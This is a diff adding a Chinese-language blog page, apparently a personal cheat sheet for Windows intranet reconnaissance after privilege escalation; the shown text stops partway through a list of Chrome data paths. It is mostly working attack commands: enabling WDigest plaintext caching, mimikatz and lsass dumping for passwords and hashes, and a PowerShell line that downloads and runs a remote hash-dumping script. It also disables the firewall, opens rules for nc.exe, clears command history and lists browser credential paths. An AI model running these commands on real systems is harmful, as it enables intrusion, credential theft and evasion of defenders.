@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://gcore.jsdelivr.net">
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel="dns-prefetch" href="//unpkg.com">
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>【windows】 内网信息收集 - oone</title>
+
+  
+    <meta name="description" content="0x00 分析入口机器在提权完成后，尽可能多的收集此机器上的各种信息。  当前机器的角色 当前机器所在网络的拓扑结构 当前机器的网络位置&#x2F;区域  0x01 收集基础信息 Mainip、进程、端口、服务、共享、软件、补丁、wifi、rdp、 123456789101112131415161718192021222324252627282930313233343536373839404142">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【windows】 内网信息收集">
+<meta property="og:url" content="http://example.com/A_OS/Windows/%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:site_name" content="oone">
+<meta property="og:description" content="0x00 分析入口机器在提权完成后，尽可能多的收集此机器上的各种信息。  当前机器的角色 当前机器所在网络的拓扑结构 当前机器的网络位置&#x2F;区域  0x01 收集基础信息 Mainip、进程、端口、服务、共享、软件、补丁、wifi、rdp、 123456789101112131415161718192021222324252627282930313233343536373839404142">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-27T01:24:02.033Z">
+<meta property="article:modified_time" content="2023-10-27T01:24:02.033Z">
+<meta property="article:author" content="mingming">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="信息">
+<meta name="twitter:card" content="summary">
+  
+  
+  
+  <meta name="keywords" content="windows,信息">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="oone" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="/images/avator.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class="l_body" id="start">
+    <aside class="l_left" layout="post">
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/holdyounger/ScopeBlog/rc_images/Images/Users/shimingming/Pictures.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">oone</div><div class="sub normal cap">固执无罪，梦想无价</div><div class="sub hover cap" style="opacity:0"> Coding For Knowledge</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item" href="/readme/">主页</a><a class="nav-item" href="/wiki/">项目</a><a class="nav-item" href="/more/">更多</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"/></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">【windows】 内网信息收集</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%88%86%E6%9E%90%E5%85%A5%E5%8F%A3%E6%9C%BA%E5%99%A8"><span class="toc-text">0x00 分析入口机器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-text">0x01 收集基础信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Main"><span class="toc-text">Main</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-text">用户与组信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E6%9C%8D%E5%8A%A1%E5%BC%80%E5%85%B3"><span class="toc-text">RDP服务开关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%85%B3-amp-%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE"><span class="toc-text">防火墙开关 &amp; 策略配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">0x02 收集敏感信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93Win%E5%AF%86%E7%A0%81%E5%92%8Chash"><span class="toc-text">抓Win密码和hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E6%97%A5%E5%BF%97-RDP%E7%99%BB%E5%BD%95%E7%97%95%E8%BF%B9"><span class="toc-text">win日志 - RDP登录痕迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">浏览器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chrome"><span class="toc-text">Chrome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QQ%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">QQ浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">360浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firefox"><span class="toc-text">firefox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IE-x2F-Edge"><span class="toc-text">IE&#x2F;Edge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-text">远程管理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#navicat"><span class="toc-text">navicat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurtCRT"><span class="toc-text">SecurtCRT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XShell"><span class="toc-text">XShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wifi%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">Wifi账号密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">0x03 域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8%E5%9F%9F%E4%B8%AD"><span class="toc-text">判断是否在域中</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF"><span class="toc-text">收集域内信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83"><span class="toc-text">域提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-text">域提权 - 定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bloodyAD-py"><span class="toc-text">bloodyAD.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psloggedon-exe"><span class="toc-text">psloggedon.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PVEFindADUser-exe"><span class="toc-text">PVEFindADUser.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netview-exe"><span class="toc-text">netview.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-NSE%E8%84%9A%E6%9C%AC"><span class="toc-text">Nmap - NSE脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerView-%E8%84%9A%E6%9C%AC"><span class="toc-text">PowerView 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E8%BF%9B%E7%A8%8B"><span class="toc-text">域提权 - 定位域管进程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%A6%82%E4%BD%95%E8%B7%A8%E7%BD%91%E6%AE%B5"><span class="toc-text">0x04 内网横向思路及如何跨网段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text">探测域内存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E7%BD%91%E6%AE%B5"><span class="toc-text">找网段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">远程连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-text">主机名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-%E9%87%8D%E7%82%B9%E5%85%B3%E6%B3%A8%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-text">端口 - 重点关注的组件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%BA%94%E7%94%A8-%E9%87%8D%E7%82%B9"><span class="toc-text">web应用 - 重点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%86%E6%9D%83%E7%B3%BB%E7%BB%9F"><span class="toc-text">集权系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">主机漏洞</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class="l_main">
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/A-OS/">A_OS</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/A-OS/Windows/">Windows</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/">工具</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-10-27T01:24:02.033Z">2023-10-27</time></div></div>
+
+<article class="md-text content post">
+<h1 class="article-title"><span>【windows】 内网信息收集</span></h1>
+<h1 id="0x00-分析入口机器"><a href="#0x00-分析入口机器" class="headerlink" title="0x00 分析入口机器"></a>0x00 分析入口机器</h1><p>在提权完成后，尽可能多的收集此机器上的各种信息。</p>
+<ul>
+<li>当前机器的角色</li>
+<li>当前机器所在网络的拓扑结构</li>
+<li>当前机器的网络位置&#x2F;区域</li>
+</ul>
+<h1 id="0x01-收集基础信息"><a href="#0x01-收集基础信息" class="headerlink" title="0x01 收集基础信息"></a>0x01 收集基础信息</h1><hr>
+<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><p>ip、进程、端口、服务、共享、软件、补丁、wifi、rdp、</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">------------------系统---------------------</span><br><span class="line"><span class="built_in">set</span>												# 查看环境变量								</span><br><span class="line">wmic bios									# 查看bios信息			</span><br><span class="line">fsutil fsinfo drives			# 查看盘符</span><br><span class="line">systeminfo								# 系统版本</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">------------------ip与网段---------------------</span><br><span class="line"><span class="built_in">ping</span> -a ip									# ip反查主机名</span><br><span class="line">netstat -A ip								# 同上</span><br><span class="line"><span class="built_in">ipconfig</span> /all 							#查看ip详细信息,关注是否多网卡、IP、DNS</span><br><span class="line"><span class="built_in">ipconfig</span> /displaydns  			#查看DNS缓存</span><br><span class="line">route <span class="built_in">print</span> 								#查看路由</span><br><span class="line">arp -a 											#查看arp缓存表</span><br><span class="line"><span class="built_in">net</span> view 										#查询机器列表</span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\drivers\etc\hosts 				#查看hosts⽂件</span><br><span class="line"></span><br><span class="line">---------------端口--------------------</span><br><span class="line">netstat -ano 											#查看端⼝开放情况</span><br><span class="line">netstat -ano|<span class="built_in">findstr</span> <span class="number">80</span>						#查看<span class="number">80</span>端⼝对应的PID</span><br><span class="line"></span><br><span class="line">---------------服务--------------------</span><br><span class="line">wmic service list brief						# 查看安装的所有服务信息</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span>													# 已启动的服务</span><br><span class="line"></span><br><span class="line">---------------共享--------------------</span><br><span class="line">wmic share get name,<span class="built_in">path</span>,status 	# 查看共享信息</span><br><span class="line"><span class="built_in">net</span> use 													# 查看已建立的连接</span><br><span class="line"><span class="built_in">net</span> share 												# 查看共享</span><br><span class="line"><span class="built_in">net</span> session 											# 查看会话</span><br><span class="line"><span class="built_in">net</span> view \ip 											# 查询指定IP共享</span><br><span class="line"></span><br><span class="line">---------------开机自启动程序--------------------</span><br><span class="line">wmic startup get command,caption</span><br><span class="line"></span><br><span class="line">---------------安装的程序--------------------</span><br><span class="line">wmic product get name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br><span class="line"></span><br><span class="line">---------------计划任务--------------------</span><br><span class="line">schtasks /query /fo LIST /v &gt; ed1dassc.txt</span><br><span class="line"></span><br><span class="line">---------------补丁信息（提权）--------------------</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">---------------进程列表（免杀）--------------------</span><br><span class="line">wmic process list brief						#当前进程列表</span><br><span class="line">tasklist													#当前进程列表</span><br><span class="line">tasklist /svc 										#查看进程、pid、服务</span><br><span class="line"><span class="built_in">taskkill</span> /f /t /im xx.exe 				#杀死xx.exe进程</span><br><span class="line"><span class="built_in">taskkill</span> /F -pid <span class="number">520</span> 							#杀死pid为<span class="number">520</span>的进程</span><br><span class="line">wmic /node:localhost /namespace:\\root\SecurityCenter2 <span class="built_in">path</span> AntiVirusProduct Get DisplayName | <span class="built_in">findstr</span> /V /B /C:displayName || <span class="built_in">echo</span> No Antivirus installed</span><br><span class="line"></span><br><span class="line">---------------查询IE浏览器的代理信息--------------------</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line"></span><br><span class="line">---------------<span class="built_in">cmd</span>、powershell（v3以下）当前窗口的历史命令--------------------</span><br><span class="line">Get-History | <span class="built_in">Format</span>-List -Property * 			# 查询 powershell 当前窗⼝历史操作记录</span><br><span class="line">Clear-History 															# 删除 powershell 当前窗⼝历史操作记录</span><br><span class="line">Clear-History -Id <span class="number">3</span> 												# 删除 指定 ID 的历史操作记录</span><br><span class="line"><span class="built_in">doskey</span> /h 																	# 查看 <span class="built_in">cmd</span> 的历史操作记录</span><br><span class="line"><span class="built_in">doskey</span> /reinstall 													# 删除 <span class="built_in">cmd</span> 的历史操作记录</span><br><span class="line"></span><br><span class="line"># powershell v3、v4 版本需要安装Get-PSReadlineOption</span><br><span class="line">msiexec /q /i PackageManagement_x64.msi</span><br><span class="line"></span><br><span class="line"># 查看 powershellv5 历史操作记录</span><br><span class="line"><span class="built_in">type</span> <span class="variable">%appdata%</span>\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line"></span><br><span class="line">---------------杂七杂八--------------------</span><br></pre></td></tr></table></figure>
+
+<h2 id="用户与组信息"><a href="#用户与组信息" class="headerlink" title="用户与组信息"></a>用户与组信息</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">---------------账户和密码信息------------------</span><br><span class="line">whoami /all 											#查询当前⽤户权限等</span><br><span class="line"><span class="built_in">net</span> user 													#只显示本机的⽤户，不显示域⽤户</span><br><span class="line"><span class="built_in">net</span> user &lt;xx&gt; 										#查看⽤户xx的具体信息</span><br><span class="line">wmic useraccount get			 								#查看本机用户 或 域内所有账户</span><br><span class="line">wmic useraccount get Caption,LocalAccount,Disabled	#</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup 										#查看本地组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators 		#查看本地组administrators管理员组。除了显示本机中⽤户，还会显示域⽤户(前提是该域⽤户在本机的Administrators组内)</span><br><span class="line"></span><br><span class="line">query user 或 quser 							 #查询当前在线⽤户</span><br><span class="line">qwinsta 													#查询当前在线⽤户</span><br><span class="line">qwinsta /SERVER:IP 								#查看远程登录情况</span><br><span class="line">query session 										#查询会话</span><br><span class="line">query termserver 									#查询远程桌⾯主机列表</span><br><span class="line"><span class="built_in">net</span> accounts 											#查看本地密码策略</span><br></pre></td></tr></table></figure>
+
+<h2 id="RDP服务开关"><a href="#RDP服务开关" class="headerlink" title="RDP服务开关"></a>RDP服务开关</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---------------远程桌面服务--------------------</span><br><span class="line">#查端口 <span class="number">0</span>xd3d &gt; <span class="number">3389</span></span><br><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line">#是否开启了rdp服务：<span class="number">0</span>x1关闭，<span class="number">0</span>x0开启</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"></span><br><span class="line">#<span class="number">2003</span>开启远程桌面</span><br><span class="line">wmic <span class="built_in">PATH</span> win32_terminalservicesetting WHERE (_Class!=&quot;&quot;) <span class="keyword">CALL</span> SetAllowTSConnections <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#<span class="number">2008</span>、<span class="number">2012</span>开启远程桌面</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices <span class="built_in">path</span> win32_terminalservicesetting where (__CLASS != &quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices <span class="built_in">path</span> win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) <span class="keyword">call</span> setuserauthenticationrequired <span class="number">1</span></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>
+
+<h2 id="防火墙开关-amp-策略配置"><a href="#防火墙开关-amp-策略配置" class="headerlink" title="防火墙开关 &amp; 策略配置"></a>防火墙开关 &amp; 策略配置</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---------------防火墙开关 &amp; 策略配置--------------------</span><br><span class="line">netsh firewall show config												#查看防火墙配置</span><br><span class="line"></span><br><span class="line">#<span class="number">2003</span>之前操作</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable																#关闭防火墙</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable		#允许nc的全部链接</span><br><span class="line"></span><br><span class="line">#<span class="number">2003</span>之后操作</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off 			#关闭防火墙</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> publicprofile state off			#关闭防火墙，??</span><br><span class="line"></span><br><span class="line">##允许nc的入站、出站、TCP3389进站连接</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; <span class="built_in">dir</span>=out action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow</span><br><span class="line"></span><br><span class="line">##自定义防火墙日志的存储位置</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自动化收集脚本：Empire、VBS脚本</li>
+<li>判断是否在域中</li>
+</ul>
+<h1 id="0x02-收集敏感信息"><a href="#0x02-收集敏感信息" class="headerlink" title="0x02 收集敏感信息"></a>0x02 收集敏感信息</h1><h2 id="抓Win密码和hash"><a href="#抓Win密码和hash" class="headerlink" title="抓Win密码和hash"></a>抓Win密码和hash</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># win10或<span class="number">2012</span>R2以上时,默认在内存缓存中禁止保存明文密码，需要修改注册表重启后才能。</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line"># 简单抓密码</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;<span class="keyword">exit</span>&quot;</span><br><span class="line"></span><br><span class="line"># 转储lsass.exe成dmp文件，再使用mimikatz本地读取（规避）</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br><span class="line"></span><br><span class="line"># powershell远程加载</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes</span><br><span class="line"></span><br><span class="line"># 转储SAM文件，再使用secretsdump.py本地读取（规避）</span><br><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+
+<h2 id="win日志-RDP登录痕迹"><a href="#win日志-RDP登录痕迹" class="headerlink" title="win日志 - RDP登录痕迹"></a>win日志 - RDP登录痕迹</h2><blockquote>
+<p>内网使用RDP的机器大概率是运维或高权限机器，可筛选LogonType为10 的Win日志，定位ip，然后ping -a <ip></ip></p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /?</span><br><span class="line">wevtutil qe Security /c:<span class="number">3</span> /rd:<span class="literal">true</span> /f:text			#<span class="number">3</span>条、最近的、txt格式，/q xpath语法</span><br><span class="line">wevtutil qe security /q:<span class="string">&quot;*[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;] and System[(EventID=4624)]]&quot;</span> /f:text /rd:<span class="literal">true</span> /c:<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p><strong>一把梭：</strong>HackBrowserData  		<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
+<h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#用户数据目录			%LOCALAPPDATA%\Google\Chrome\User Data\Default\</span><br><span class="line">#缓存目录					%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\</span><br><span class="line">#书签							%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks</span><br><span class="line">#Cookie						%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies</span><br><span class="line">#浏览历史					%LOCALAPPDATA%\Google\Chrome\User Data\Default\History</span><br><span class="line">#当前的session 	 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Current Session</span><br><span class="line">#账户密码					%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data</span><br><span class="line">									